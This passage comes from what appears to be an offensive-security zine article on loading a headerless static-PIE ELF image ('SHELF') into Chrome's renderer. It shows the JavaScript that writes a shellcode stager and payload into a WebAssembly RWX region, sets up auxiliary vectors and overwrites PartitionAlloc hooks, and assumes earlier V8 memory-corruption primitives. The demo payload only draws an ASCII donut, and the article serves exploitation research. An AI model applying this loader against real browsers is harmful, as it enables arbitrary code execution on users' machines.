</span></span><span class="line"><span class="cl">                    <span class="n">y</span> <span class="o">=</span> <span class="mi">12</span> <span class="o">+</span> <span class="mi">15</span> <span class="o">*</span> <span class="n">mess</span> <span class="o">*</span> <span class="p">(</span><span class="n">cosi</span> <span class="o">*</span> <span class="n">cosj2</span> <span class="o">*</span> <span class="n">sinB</span> <span class="o">+</span> <span class="n">t</span> <span class="o">*</span> <span class="n">cosB</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">o</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">80</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">N</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">*</span> <span class="p">((</span><span class="n">sinj</span> <span class="o">*</span> <span class="n">sinA</span> <span class="o">-</span> <span class="n">sini</span> <span class="o">*</span> <span class="n">cosj</span> <span class="o">*</span> <span class="n">cosA</span><span class="p">)</span> <span class="o">*</span> <span class="n">cosB</span> <span class="o">-</span> <span class="n">sini</span> <span class="o">*</span> <span class="n">cosj</span>
</span></span><span class="line"><span class="cl">                    <span class="o">*</span> <span class="n">sinA</span> <span class="o">-</span> <span class="n">sinj</span> <span class="o">*</span> <span class="n">cosA</span> <span class="o">-</span> <span class="n">cosi</span> <span class="o">*</span> <span class="n">cosj</span> <span class="o">*</span> <span class="n">sinB</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span> <span class="mi">22</span> <span class="o">&gt;</span> <span class="n">y</span> <span class="o">&amp;&amp;</span> <span class="n">y</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">x</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">                    <span class="mi">80</span> <span class="o">&gt;</span> <span class="n">x</span> <span class="o">&amp;&amp;</span> <span class="n">mess</span> <span class="o">&gt;</span> <span class="n">z</span><span class="p">[</span><span class="n">o</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">                    <span class="n">z</span><span class="p">[</span><span class="n">o</span><span class="p">]</span> <span class="o">=</span> <span class="n">mess</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">b</span><span class="p">[</span><span class="n">o</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.,-~:;=!*#$@&#34;</span><span class="p">[</span> <span class="n">N</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="nl">N</span> <span class="p">:</span> <span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1b</span><span class="s">[d&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="mi">1761</span> <span class="o">&gt;</span> <span class="n">k</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">putchar</span><span class="p">(</span><span class="n">k</span> <span class="o">%</span> <span class="mi">80</span> <span class="o">?</span> <span class="n">b</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">:</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">A</span> <span class="o">+=</span> <span class="mf">0.04</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">B</span> <span class="o">+=</span> <span class="mf">0.02</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Hi from SHELF!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>When we create our SHELF instance, we need to make sure to make a copy of the image before removing its Program Header Table:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc-9 donut.c -lm --static-pie -T ./static-pie.ld -o <span class="nb">test</span>
</span></span><span class="line"><span class="cl">cp <span class="nb">test</span> test_org
</span></span><span class="line"><span class="cl">python strip_headers.py ./test
</span></span><span class="line"><span class="cl">xxd -i ./test &gt;&gt; ./include/embedded.h
</span></span></code></pre></td></tr></table>
</div>
</div><p>We need to retrieve the <code>p_filesz</code> of the  <code>PT_LOAD</code> segment of our SHELF image. This will be the size of our javascript payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Entry</span> <span class="n">point</span> <span class="mh">0x8920</span>
</span></span><span class="line"><span class="cl"><span class="n">There</span> <span class="n">are</span> <span class="mi">3</span> <span class="n">program</span> <span class="n">headers</span><span class="p">,</span> <span class="n">starting</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Program</span> <span class="nl">Headers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">Type</span>           <span class="n">Offset</span>             <span class="n">VirtAddr</span>           <span class="n">PhysAddr</span>
</span></span><span class="line"><span class="cl">                 <span class="n">FileSiz</span>            <span class="n">MemSiz</span>              <span class="n">Flags</span>  <span class="n">Align</span>
</span></span><span class="line"><span class="cl">  <span class="n">LOAD</span>           <span class="mh">0x0000000000000000</span> <span class="mh">0x0000000000000000</span> <span class="mh">0x0000000000000000</span>
</span></span><span class="line"><span class="cl">                 <span class="mh">0x00000000000cb1f0</span> <span class="mh">0x00000000000cca80</span>  <span class="n">RWE</span>    <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl">  <span class="n">DYNAMIC</span>        <span class="mh">0x00000000000c8c18</span> <span class="mh">0x00000000000c8c18</span> <span class="mh">0x00000000000c8c18</span>
</span></span><span class="line"><span class="cl">                 <span class="mh">0x00000000000025d8</span> <span class="mh">0x0000000000003e40</span>  <span class="n">RW</span>     <span class="mh">0x20</span>
</span></span><span class="line"><span class="cl">  <span class="n">TLS</span>            <span class="mh">0x00000000000c5628</span> <span class="mh">0x00000000000c5628</span> <span class="mh">0x00000000000c5628</span>
</span></span><span class="line"><span class="cl">                 <span class="mh">0x0000000000000020</span> <span class="mh">0x0000000000000060</span>  <span class="n">RW</span>     <span class="mh">0x8</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can create a javascript file containing the output of <code>xxd -i</code>, to then format it as a valid javascript file, also overwriting the value of the payload size with the value of <code>p_filesz</code> as previously mentioned:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">G_AT_ENTRY</span> <span class="o">=</span> <span class="mh">0x8920</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">G_AT_PHNUM</span> <span class="o">=</span> <span class="mh">0x3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">phdr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">payload_len</span> <span class="o">=</span> <span class="mh">0xcb1f0</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Once we have our SHELF image ready and accessible from our exploit, we have to set our SHELF image&rsquo;s stack and delta offset of our headless ELF image. These offsets correspond to the following values:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// setting a safe address for SHELF stack
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">shelf_stack</span> <span class="o">=</span> <span class="p">(</span><span class="nx">stack_leak</span><span class="o">-</span><span class="mh">0x80000</span><span class="nx">n</span><span class="p">)</span>  <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0xfff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">shelf_delta</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">sizeof_Elf64_Ehdr</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">G_AT_PHNUM</span><span class="p">)</span> <span class="o">*</span> <span class="nx">sizeof_Elf64_Phdr</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we have to copy our SHELF image to our RWX region, and write a stager where the original ELF headers would have been at the beginning of our SHELF image. This stager is in charge of jumping to the SHELF entrypoint and setting the right stack address before doing so:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/* [stager] :
</span></span></span><span class="line"><span class="cl"><span class="cm">    48 b8 42 42 42 42 42 42 42 42       movabs rax,0x4242424242424242
</span></span></span><span class="line"><span class="cl"><span class="cm">    48 89 c4                            mov rsp,rax
</span></span></span><span class="line"><span class="cl"><span class="cm">    48 31 db                            xor rbx,rbx
</span></span></span><span class="line"><span class="cl"><span class="cm">    48 31 c9                            xor rcx,rcx
</span></span></span><span class="line"><span class="cl"><span class="cm">    48 31 d2                            xor rdx,rdx
</span></span></span><span class="line"><span class="cl"><span class="cm">    48 31 f6                            xor rsi,rsi
</span></span></span><span class="line"><span class="cl"><span class="cm">    48 31 ff                            xor rdi,rdi
</span></span></span><span class="line"><span class="cl"><span class="cm">    48 b8 41 41 41 41 41 41 41 41       movabs rax,0x4141414141414141
</span></span></span><span class="line"><span class="cl"><span class="cm">    ff e0                               jmp rax
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">stack_addr_bytes</span> <span class="o">=</span> <span class="nx">bigint_to_array</span><span class="p">(</span><span class="nx">shelf_stack</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">entry_point_bytes</span> <span class="o">=</span> <span class="nx">bigint_to_array</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">G_AT_ENTRY</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">stager</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span><span class="nx">stack_addr_bytes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span><span class="nx">entry_point_bytes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xe0</span>
</span></span><span class="line"><span class="cl"><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">stager</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">wasm_accessor</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">stager</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">wasm_accessor</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">shelf_delta</span><span class="o">+</span><span class="nx">i</span><span class="p">,</span> <span class="nx">payload</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At this point, all we have left to do is to write the SHELF image <code>Elf64_Auxv_t</code> instance in the SHELF&rsquo;s stack:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">phdr_addr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">stable_addrof</span><span class="p">(</span><span class="nx">phdr</span><span class="p">))</span> <span class="o">+</span> <span class="mh">0x28</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">phdr_addr_bstore</span> <span class="o">=</span> <span class="nx">heap_accesor</span><span class="p">.</span><span class="nx">getBigUint64</span><span class="p">(</span><span class="nb">Number</span><span class="p">(</span><span class="nx">phdr_addr</span> <span class="o">-</span><span class="mi">1</span><span class="nx">n</span><span class="p">),</span> <span class="kc">true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span> <span class="nx">AT_PHDR</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x08</span><span class="p">,</span> <span class="nx">phdr_addr_bstore</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="nx">AT_PHNUM</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">G_AT_PHNUM</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="nx">AT_ENTRY</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">G_AT_ENTRY</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="nx">AT_RANDOM</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="nx">AT_PHENT</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="nx">sizeof_Elf64_Phdr</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="nx">AT_NULL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="nx">stack_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="mi">0</span><span class="nx">n</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Overall, the layout of our SHELF Image can be shown in the diagram below:</p>
<div style="text-align:center"><img src ="https://tmpout.sh/2/img/2022-02-16_23-09.png" /></div>
<p>To pivot control of execution to our RWX region, we can use our wasm function accessor to do:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">wasm_entry</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Alternatively, if we would like to use any other technique to generate a RWX region, we can overwritte <code>PartitionAllocs</code> hooks to do so, much like we would do with <code>__free_hook</code> or <code>__malloc_hook</code> for glibc:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">//base::PartitionAllocHooks::hooks_enabled_
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">chrome_accesor</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="nx">kHooksEnabled</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//base::PartitionAllocHooks::free_observer_hook_
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">chrome_accesor</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="nx">kFreeObserverHook</span><span class="p">,</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is a screenshot of our test involving the execution of a SHELF image compiled with <em>libm</em> on Chrome launched with the following flags :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chrome --no-sandbox --user-data-dir<span class="o">=</span>/tmp
</span></span></code></pre></td></tr></table>
</div>
</div><div style="text-align:center"><img src ="https://tmpout.sh/2/img/aaa.gif" /></div>
<p>if we check the process tree of chrome we will see the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    ├─chrome,104737   	   &lt;-- Browser Process
</span></span><span class="line"><span class="cl">    │   ├─chrome,104739
</span></span><span class="line"><span class="cl">    │   │   ├─chrome,104762  &lt;-- GPU Process
</span></span><span class="line"><span class="cl">    │   │       ....
</span></span><span class="line"><span class="cl">    │   ├─chrome,104740
</span></span><span class="line"><span class="cl">    │   │   ├─chrome,104948  &lt;-- Renderer process
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104953
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104955
</span></span><span class="line"><span class="cl">    │   │   │   ├─{chrome},104956
